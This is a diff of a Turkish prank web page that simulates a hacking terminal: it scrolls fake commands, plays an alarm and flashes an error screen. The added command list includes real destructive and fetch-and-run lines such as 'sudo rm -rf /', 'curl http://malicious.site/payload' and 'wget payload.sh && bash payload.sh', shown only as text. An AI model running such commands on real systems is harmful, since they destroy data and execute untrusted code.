@@ -2,205 +2,142 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Korku Terminali</title>
+  <title>Zero-Day Sim Final</title>
   <style>
     body {
-      margin: 0;
-      background: black;
-      font-family: monospace;
-      overflow: hidden;
+      margin:0; padding:0; height:100%;
+      background:black; font-family:monospace;
+      overflow:hidden;
     }
-
-    #startScreen {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: black;
-      z-index: 10000;
+    #startBtn {
+      position:fixed; top:20px; right:20px;
+      width:80px; height:80px;
+      font-size:48px; color:#0f0;
+      border:3px solid #0f0; background:black;
+      border-radius:50%; cursor:pointer;
+      display:flex; justify-content:center; align-items:center;
+      z-index:1000;
     }
-
-    #closeBtn {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      font-size: 30px;
-      color: red;
-      cursor: pointer;
-      border: none;
-      background: none;
+    #mhmtBox {
+      position:absolute; top:50%; left:50%;
+      transform:translate(-50%,-50%);
+      padding:20px 40px; font-size:32px;
+      border:2px solid #0f0; color:#0f0;
+      display:none; animation:blink 1s infinite;
+      z-index:1000;
     }
-
-    #mhmtxaslanBox {
-      display: none;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 28px;
-      padding: 30px 60px;
-      border: 2px solid lime;
-      color: lime;
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.4; }
-    }
-
+    @keyframes blink{0%,100%{opacity:1;}50%{opacity:0.3;}}
     .terminal {
-      position: absolute;
-      width: 90%;
-      height: 40%;
-      background: #000;
-      border: 2px solid white;
-      padding: 10px;
-      overflow: hidden;
-      font-size: 16px;
-      white-space: pre-wrap;
-      display: none;
+      position:absolute; left:5%;
+      width:90%; background:black;
+      border:2px solid white; color:#fff;
+      padding:10px; font-size:16px;
+      height:35%; overflow:auto;
+      white-space:pre-wrap; display:none;
+      box-sizing:border-box;
     }
-
-    #terminalTop {
-      top: 0;
-      left: 5%;
-      color: white;
+    #termTop{top:0;}
+    #termBottom{bottom:0; color:#0f0;}
+    #errorMsg {
+      position:absolute; top:30%; left:50%;
+      transform:translateX(-50%);
+      color:red; font-size:64px; display:none;
+      animation:flash 0.5s infinite alternate;
+      z-index:2000; text-align:center;
     }
-
-    #terminalBottom {
-      bottom: 0;
-      left: 5%;
-      color: lime;
+    #errorImg {
+      max-width:500px;
+      width:80%;
+      margin-top:20px;
+      animation:flash 1s infinite alternate;
     }
-
-    .error {
-      position: absolute;
-      font-size: 50px;
-      color: red;
-      left: 50%;
-      transform: translateX(-50%);
-      animation: bounce 1s infinite alternate;
-      z-index: 999;
-      display: none;
-    }
-
-    @keyframes bounce {
-      0% { top: 30%; }
-      100% { top: 60%; }
-    }
-
-    .exclamation {
-      position: absolute;
-      font-size: 30px;
-      color: red;
-      animation: flash 0.3s infinite;
-      z-index: 999;
-    }
-
-    @keyframes flash {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
+    @keyframes flash{0%{opacity:1;}100%{opacity:0;}}
+    .excl{
+      position:absolute; color:red; font-size:32px;
+      animation:flash 0.5s infinite;
     }
   </style>
 </head>
 <body>
 
-<div id="startScreen">
-  <button id="closeBtn">X</button>
-  <div id="mhmtxaslanBox">@mhmtxaslan</div>
+<button id="startBtn">X</button>
+<div id="mhmtBox">@mhmtxaslan</div>
+<div id="termTop" class="terminal"></div>
+<div id="termBottom" class="terminal"></div>
+<div id="errorMsg">
+  !!! ERROR !!!
+  <br>
+  <img id="errorImg" src="A_digital_image_simulating_a_hacking_terminal_scre.png" alt="Terminal Image">
 </div>
-
-<div id="terminalTop" class="terminal"></div>
-<div id="terminalBottom" class="terminal"></div>
-<div id="error" class="error">!!! ERROR !!!</div>
-
-<audio id="alarm" loop>
-  <source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg">
-</audio>
+<audio id="alarm"><source src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" type="audio/ogg"></audio>
 
 <script>
-  const startScreen = document.getElementById("startScreen");
-  const closeBtn = document.getElementById("closeBtn");
-  const mhmtBox = document.getElementById("mhmtxaslanBox");
-  const termTop = document.getElementById("terminalTop");
-  const termBottom = document.getElementById("terminalBottom");
-  const errorText = document.getElementById("error");
-  const alarm = document.getElementById("alarm");
+  const startBtn = document.getElementById("startBtn"),
+        mhmtBox = document.getElementById("mhmtBox"),
+        termTop = document.getElementById("termTop"),
+        termBottom = document.getElementById("termBottom"),
+        errorMsg = document.getElementById("errorMsg"),
+        alarm = document.getElementById("alarm");
 
-  closeBtn.addEventListener("click", () => {
-    closeBtn.style.display = "none";
+  startBtn.onclick = () => {
+    startBtn.style.display = "none";
     mhmtBox.style.display = "block";
 
-    // 3 saniyede kırmızıya dön
     setTimeout(() => {
-      mhmtBox.style.color = 'red';
-      mhmtBox.style.borderColor = 'red';
-    }, 3000);
+      mhmtBox.style.color = "red";
+      mhmtBox.style.borderColor = "red";
+    },3000);
 
-    // 5 saniye sonra mhmtxaslan kaybolur
     setTimeout(() => {
       mhmtBox.style.display = "none";
-      startScreen.style.display = "none";
-      startSequence();
-    }, 5000);
-  });
-
-  function startSequence() {
-    setTimeout(() => {
       termTop.style.display = "block";
       termBottom.style.display = "block";
-    }, 500);
+      startFlow();
+    },5000);
+  };
 
-    let lines = [
-      "[+] Port 443 açık.",
-      "[*] Sunucu yanıt veriyor...",
-      "[!] Root erişimi tespit edildi!",
-      "[#] Paket aktarımı başladı...",
-      "[!] Güvenlik duvarı devre dışı bırakıldı.",
-      "[!] Giriş bilgileri çekiliyor...",
-      "[!] ERROR: Erişim reddedildi!",
-      "[!] ERROR: Erişim reddedildi!",
-      "[!] Sistem çöküyor...",
+  function startFlow(){
+    const cmds = [
+      "curl http://malicious.site/payload",
+      "LongLongEarth.exe --scan port 4444",
+      "tracert 192.168.0.1",
+      "hack --user admin",
+      "sudo rm -rf /",
+      "apt-get install pwnkit",
+      "nmap -sV 10.10.10.10",
+      "wget payload.sh && bash payload.sh",
+      "ping -t 127.0.0.1",
+      "git clone https://evil.git/repo.git"
     ];
-
-    let count = 0;
-    const interval = setInterval(() => {
-      const l = lines[Math.floor(Math.random() * lines.length)];
-      if (termTop.innerText.split('\n').length < 25) {
-        termTop.innerText += l + "\n";
-        termBottom.innerText += l + "\n";
-      } else {
-        termTop.innerText = termTop.innerText.split('\n').slice(1).join('\n') + "\n" + l;
-        termBottom.innerText = termBottom.innerText.split('\n').slice(1).join('\n') + "\n" + l;
-      }
+    let count=0, maxLines=30;
+    const loop = setInterval(()=>{
+      const cmd = cmds[Math.floor(Math.random()*cmds.length)];
+      const colorTop="#fff", colorBottom = count>15?"red":"#0f0";
+      termTop.innerHTML += `<span style="color:${colorTop}">${cmd}</span>\n`;
+      termBottom.innerHTML += `<span style="color:${colorBottom}">${cmd}</span>\n`;
+      termTop.scrollTop = termTop.scrollHeight;
+      termBottom.scrollTop = termBottom.scrollHeight;
       count++;
+      if(count>=maxLines){
+        clearInterval(loop);
+      }
+    },300);
 
-      // Renk geçişi
-      if (count === 20) termBottom.style.color = "red";
-      if (count >= 60) clearInterval(interval);
-    }, 250);
-
-    // 10. saniyede ses başlasın
+    setTimeout(() => alarm.play(),10000);
     setTimeout(() => {
-      alarm.play();
-    }, 10000);
-
-    // 15. saniyede ERROR ve ünlemler
-    setTimeout(() => {
-      errorText.style.display = "block";
-      spawnExclamations();
-    }, 15000);
+      errorMsg.style.display = "block";
+      spawnExcl(40);
+    },20000);
   }
 
-  function spawnExclamations() {
-    for (let i = 0; i < 25; i++) {
-      const ex = document.createElement("div");
-      ex.className = "exclamation";
-      ex.innerText = "!";
-      ex.style.top = Math.random() * window.innerHeight + "px";
-      ex.style.left = Math.random() * window.innerWidth + "px";
-      document.body.appendChild(ex);
+  function spawnExcl(n){
+    for(let i=0;i<n;i++){
+      const e = document.createElement("div");
+      e.className="excl";
+      e.innerText="!";
+      e.style.top=Math.random()*100+"vh";
+      e.style.left=Math.random()*100+"vw";
+      document.body.appendChild(e);
     }
   }
 </script>
